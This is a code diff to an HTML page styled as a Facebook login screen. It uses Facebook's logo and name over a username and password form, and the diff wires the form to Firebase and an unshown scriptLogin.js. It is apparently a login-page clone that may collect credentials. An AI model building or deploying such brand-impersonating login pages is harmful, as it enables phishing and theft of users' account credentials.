@@ -17,6 +17,15 @@
         body{
             background-image:linear-gradient(rgb(207, 222, 250),rgb(107, 106, 204));
         }
+        .alert {
+            border-radius: 3%;
+            text-align: center;
+            padding: 10px;
+            background: #79c879;
+            color: #fff;
+            margin-bottom: 10px;
+            display: none;
+        }
     </style>
     <body>
 
@@ -59,13 +68,14 @@
   </div>  
 
         <div class="wrapper">
+            <div class="alert"></div>
             <div class="logo">
                 <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="">
             </div>
             <div class="text-center mt-4 name">
                 facebook
             </div>
-            <form class="p-3 mt-3">
+            <form id="log" class="p-3 mt-3">
                 <div class="form-field d-flex align-items-center">
                     <span class="far fa-user"></span>
                     <input type="text" name="userName" id="userName" placeholder="Username">
@@ -81,5 +91,6 @@
             </div>
         </div>
     </body>
-
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+	<script src="scriptLogin.js" charset="utf-8"></script>
 </html>
